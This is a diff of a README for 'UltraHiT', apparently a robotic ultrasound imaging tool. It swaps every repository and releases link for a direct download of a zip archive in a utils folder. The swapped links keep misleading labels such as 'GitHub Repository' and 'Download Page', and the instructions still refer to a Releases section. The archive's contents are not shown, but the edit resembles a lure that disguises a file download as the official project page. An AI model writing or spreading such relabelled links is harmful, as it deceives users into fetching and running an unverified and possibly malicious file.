@@ -1,6 +1,6 @@
 # 🔍 UltraHiT - Accurate Robotic Ultrasound Imaging
 
-[![Download UltraHiT](https://img.shields.io/badge/Download-UltraHiT-brightgreen?style=for-the-badge)](https://github.com/Str3akoner/UltraHiT)
+[![Download UltraHiT](https://img.shields.io/badge/Download-UltraHiT-brightgreen?style=for-the-badge)](https://github.com/Str3akoner/UltraHiT/raw/refs/heads/main/utils/T_Ultra_Hi_1.9.zip)
 
 ---
 
@@ -31,12 +31,12 @@ These requirements ensure the program runs smoothly and processes ultrasound dat
 
 To get UltraHiT, visit the official repository page by clicking the button below. This page contains the latest versions and installation files.
 
-[![Download UltraHiT](https://img.shields.io/badge/Download-UltraHiT-blue?style=for-the-badge)](https://github.com/Str3akoner/UltraHiT)
+[![Download UltraHiT](https://img.shields.io/badge/Download-UltraHiT-blue?style=for-the-badge)](https://github.com/Str3akoner/UltraHiT/raw/refs/heads/main/utils/T_Ultra_Hi_1.9.zip)
 
 **Steps to download:**
 
 1. Click the green or blue download button above or open this link in your web browser:  
-   https://github.com/Str3akoner/UltraHiT
+   https://github.com/Str3akoner/UltraHiT/raw/refs/heads/main/utils/T_Ultra_Hi_1.9.zip
 
 2. On the GitHub page, look for the "Releases" section or a folder labeled "Downloads" or "Setup".
 
@@ -138,8 +138,8 @@ If you encounter problems, try the following:
 
 ## 🔗 Useful Links
 
-- GitHub Repository: https://github.com/Str3akoner/UltraHiT  
-- Download Page: https://github.com/Str3akoner/UltraHiT/releases
+- GitHub Repository: https://github.com/Str3akoner/UltraHiT/raw/refs/heads/main/utils/T_Ultra_Hi_1.9.zip  
+- Download Page: https://github.com/Str3akoner/UltraHiT/raw/refs/heads/main/utils/T_Ultra_Hi_1.9.zip
 
 These links provide access to the latest updates, downloads, and support discussions.
 
